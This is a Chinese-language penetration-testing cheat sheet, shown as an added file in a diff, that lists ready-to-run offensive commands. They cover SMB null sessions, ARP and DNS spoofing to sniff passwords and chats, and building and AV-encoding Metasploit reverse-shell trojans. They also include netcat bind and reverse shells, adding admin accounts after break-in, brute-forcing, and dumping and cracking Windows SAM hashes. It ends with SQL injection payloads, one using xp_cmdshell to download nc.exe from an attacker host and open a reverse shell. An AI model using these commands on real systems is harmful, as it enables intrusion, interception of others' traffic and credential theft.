@@ -1,0 +1,486 @@
+ping 域名/ip 测试本机到远端主机是否联通。
+
+dig 域名/ip 查看域名解析的详细信息。
+
+host -l 域名 dns服务器 传输zone。
+
+扫描
+
+nmap:
+
+-sS 半开扫描TCP和SYN扫描。
+
+-sT 完全TCP连接扫描。
+
+-sU UDP扫描
+
+-PS syn包探测(防火墙探测)
+
+-PA ack包探测(防火墙探测)
+
+-PN 不ping。
+
+-n 不dns解析。
+
+-A -O和-sV。
+
+-O 操作系统识别。
+
+-sV 服务版本信息(banner)
+
+-p 端口扫描。
+
+-T 设置时间级别(0-5)
+
+-iL 导入扫描结果。
+
+-oG 输出扫描结果。
+
+ 
+
+操作系统识别:
+
+p0f -i eth0 -U -p 开启混杂模式。
+
+xprobe2 ip|域名 检测os。
+
+ 
+
+banner获取:
+
+nc ip port 检测端口是否打开。
+
+telnet ip port 检测端口是否打开。
+
+wget ip 下载主页。
+
+cat index.html | more 显示主页代码。
+
+q 退出。
+
+ 
+
+windows枚举
+
+nmap -sS -p 139,445 ip 扫描windows。
+
+cd /pentest/enumeration/smb-enum
+
+nbtscan -f targetIP 检测netbios。
+
+smbgetserverinfo -i targetIP 扫描name,os,组。
+
+smbdumpusers -i targetIP 列出用户。
+
+smbclient -L //targetIP 列出共享。
+
+ 
+
+使用windows:
+
+net use \\ip\ipc$ “” /u:”" 开启空会话。
+
+net view \\ip 显示共享信息。
+
+smbclient:
+
+smbclient -L hostName -I targetIP 枚举共享。
+
+smbclient -L hostName/share -U “” 用空用户连接。
+
+smbclient -L hostName -I targetIP -U admin普通用户连接。
+
+ 
+
+rpcclient:
+
+rpcclient targetIP -U “”打开一个空会话。
+
+netshareenum 枚举共享。
+
+enumdomusers 枚举用户。
+
+lsaenumsid 枚举域SID。
+
+queryuser RID 查询用户信息。
+
+createdomuser 创建用户访问。
+
+ 
+
+ARP欺骗:
+
+ettercap:
+
+nano /usr/local/etc/etter.conf配置文件
+
+Sniff > Unified sniffing > Network interface: eth0 > OK 设置抓包的网卡
+
+Hosts > Scan for hosts (do this two times)扫描网段的主机
+
+Hosts > Hosts list 显示主机列表
+
+Select the default gateway > Add to Target 1 添加主机
+
+Select the target > Add to Target 2 添加主机
+
+Mitm > Arp poisoning > Sniff remote connections > OK 设置ARP攻击
+
+Start > Start sniffing 开始攻击
+
+dsniff -i eth0 监听网卡窃听登录用户密码
+
+urlsnarf -i eth0 嗅探http请求
+
+msgsnarf -i eth0 嗅探聊天软件的聊天内容
+
+driftnet -i eth0 网络管理嗅探图片，音频。
+
+ 
+
+dns欺骗:
+
+nano /usr/local/share/ettercap/etter.dns编辑配置文件
+
+Plugins > Manage the plugins > dns_spoof 设置dns欺骗
+
+Mitm > Arp poisoning > Sniff remote connections > OK 设置ARP
+
+Start > Start sniffing 开始攻击
+
+ 
+
+Exploits漏洞利用:
+
+cd /pentest/exploits/exploit-db 进入目录
+
+cat sploitlist.txt | grep -i [exploit] 查询需要的漏洞
+
+cat exploit | grep “#include”检查运行环境
+
+cat sploitlist.txt | grep -i exploit | cut -d ” ” -f1 | xargs grep sys | cut -d “:” -f1 | sort -u只保留可以在linux下运行的代码
+
+ 
+
+Metasploit:
+
+svn update 升级
+
+./msfweb Web接口127.0.0.1:55555。.
+
+./msfconsole 字符下的Console。
+
+help 帮助
+
+show <option> 显示选项
+
+search <name> 搜索名字
+
+use <exploit name> 使用漏洞
+
+show options 显示选项
+
+set <OPTION NAME> <option> 设置选项
+
+show payloads 显示装置
+
+set PAYLOAD <payload name> 设置装置
+
+show options 显示选项
+
+set <OPTION NAME> <option> 设置选项
+
+show targets 显示目标(os版本)
+
+set TARGET <target number> 设置目标版本
+
+exploit 开始漏洞攻击
+
+sessions -l 列出会话
+
+sessions -i <ID> 选择会话
+
+sessions -k <ID> 结束会话
+
+<ctrl> z 把会话放到后台
+
+<ctrl> c 结束会话
+
+jobs 列出漏洞运行工作
+
+jobs -K 结束一个漏洞运行工作
+
+show auxiliary 显示辅助模块
+
+use <auxiliary name> 使用辅助模块
+
+set <OPTION NAME> <option> 设置选项
+
+run 运行模块
+
+scanner/smb/version 扫描系统版本
+
+scanner/mssql/mssql_ping 测试mssql是否在线
+
+scanner/mssql/mssql_login 测试登录(暴力或字典)
+
+Attacker behind firewall: bind shell正向
+
+Target behind firewall: reverse shell反向
+
+Meterpreter衔接不懂dos的可以用这个:
+
+db_import_nessus_nbe 加载nessus的扫描结果
+
+db_import_nmap_xml 加载nmap的扫描结果
+
+自动化攻击流程:
+
+cd /pentest/exploit/framework3
+
+./msfconsole
+
+load db_sqlite3
+
+db_destroy pentest
+
+db_create pentest
+
+db_nmap targetIP
+
+db_hosts
+
+db_services
+
+db_autopwn -t -p -e
+
+字符接口攻击流程:
+
+./msfcli | grep -i <name>
+
+./msfcli <exploit or auxiliary> S
+
+./msfcli <exploit name> <OPTION NAME>=<option> PAYLOAD=<payload name> E
+
+做木马后门等:
+
+./msfpayload <payload> <variable=value> <output type>
+
+S summary and options of payload
+
+C C language
+
+P Perl
+
+y Ruby
+
+R Raw, allows payload to be piped into msfencode and other tools
+
+J JavaScript
+
+X Windows executable
+
+./msfpayload windows/shell/reverse_tcp LHOST=10.1.1.1 C
+
+./msfpayload windows/meterpreter/reverse_tcp LHOST=10.1.1.1 LPORT=4444 X > evil.exe
+
+编码处理就是做免杀:
+
+./msfencode <options> <variable=value>
+
+./msfpayload linux_ia32_bind LPORT=4444 R | ./msfencode -b ‘\x00′ -l
+
+./msfpayload linux_ia32_bind LPORT=4444 R | ./msfencode -b ‘\x00′ -e PexFnstenvMor -t c
+
+ 
+
+入侵后在windows下添加管理员用户:
+
+hostname 查看主机名
+
+net users 查看用户
+
+net user 用户 密码 /add 添加用户
+
+net localgroup 查看工作组
+
+net localgroup administrators 查看管理员组
+
+net localgroup administrators x /add 将用户加入管理员组
+
+ 
+
+TFTP
+
+cp /pentest/windows-binaries/tools/nc.exe /tmp/传递到tftp上
+
+tftp -i 10.1.1.2 GET nc.exe下载
+
+ 
+
+netcat瑞士军刀
+
+attacker: 10.1.1.1
+
+target: 10.1.1.2
+
+nc -v -z 10.1.1.2 1-1024 端口扫描
+
+target: nc -lvp 4444 聊天设置(服务)
+
+attacker: nc -v 10.1.1.2 4444 聊天设置(客户)
+
+target: nc -lvp 4444 > output.txt传输文件(接受)
+
+attacker: nc -v 10.1.1.2 4444 < test.txt传输文件(发送)
+
+target: nc -lvp 4444 -e cmd.exe Bind shell。
+
+attacker: nc -v 10.1.1.2 4444
+
+target:nc -lvp 4444 Reverse shell。
+
+attacker:nc -v 10.1.1.2 4444 -e /bin/bash
+
+ 
+
+密码
+
+字典zcat /pentest/password/dictionaries/wordlist.txt.Z > words
+
+cat words | wc -l显示个数(30多万个)
+
+暴力:
+
+hydra -l ftp -P words -v targetIP ftp 攻击ftp。
+
+hydra -l muts -P words -v targetIP pop3 攻击pop3
+
+hydra -P words -v targetIP snmp 攻击snmp
+
+攻击microsof VPN
+
+nmap -p 1723 targetIP
+
+dos2unix words
+
+cat words | thc-pptp-bruter targetIP
+
+WYD:
+
+wget -r www.target.com –accept=pdf 下载pdf文档
+
+wyd.pl -o output.txt www.target.com/
+
+cat output.txt | more
+
+SAM文件(windows下的密码文件):
+
+%SYSTEMROOT%/system32/config
+
+%SYSTEMROOT%/repair
+
+备份windows的hash文件:
+
+./msfcli exploit/windows/dcerpc/ms03_026_dcom RHOST=targetIP PAYLOAD=windows/meterpreter/bind_tcp E
+
+meterpreter > upload -r /tmp/pwdump6 c:\\windows\\system32\\
+
+meterpreter > execute -f cmd -c
+
+meterpreter > interact x
+
+C:\WINDOWS\system32> pwdump \\127.0.0.1
+
+john破解密码:
+
+cp hash.txt /pentest/password/john-1.7.2/run/
+
+cd /pentest/password/john-1.7.2/run/
+
+./john hash.txt
+
+彩虹表:
+
+rcrack *.rt -f hash.txt
+
+ 
+
+本地修改密码:
+
+mount
+
+umount /mnt/hda1
+
+modprobe fuse
+
+ntfsmount /dev/hda1 /mnt/hda1
+
+mount
+
+ls -l /mnt/hda1 挂载c盘
+
+bkhive /mnt/sda1/WINDOWS/system32/config/system system.txt
+
+samdump2 /mnt/sda1/WINDOWS/system32/config/sam system.txt > hash.txt 备份sam文件
+
+直接修改sam文件:
+
+chntpw /mnt/sda1/WINDOWS/system32/config/SAM
+
+Blank the password. *
+
+Do you really wish to change it? y
+
+Write hive files? y
+
+unmount /mnt/sda1
+
+reboot
+
+ 
+
+SQL 注入
+
+nmap -sS -p 1521 targetIP 扫描oracle
+
+nmap -sS -p T:1433,U:1434 targetIP 扫描mssql
+
+‘ or 1=1–验证旁路
+
+列举表名:
+
+‘ having 1=1–
+
+‘ group by table having 1=1–
+
+‘ group by table, table2 having 1=1–
+
+‘ group by table, table2, table3 having 1=1–
+
+列举列类型:
+
+union select sum(column) from table –
+
+union select sum(column2) from table –
+
+添加数据:
+
+‘ ; insert into table values(‘value’,'value2′,’value3′)–
+
+MSSQL存储程序:
+
+输出数据库中备案信息到一个html文件,您可以查看与一个浏览器。
+
+‘ ; exec sp_makewebtask “c:\Inetpub\wwwroot\test.html”, “select * from table” ; — www.target.com/test.html
+
+运行ipconfig在浏览器查看信息。
+
+‘ or 1=1; exec master..xp_cmdshell ‘ “ipconfig” > c:\Inetpub\wwwroot\test.txt’ ;– www.target.com/test.txt
+
+上传后门。
+
+‘ or 1=1; exec master..xp_cmdshell ‘ “tftp -i attackIP GET nc.exe && nc.exe attackIP 53 -e cmd.exe’ ; –
+
+攻击者: nc -lvp 53
+
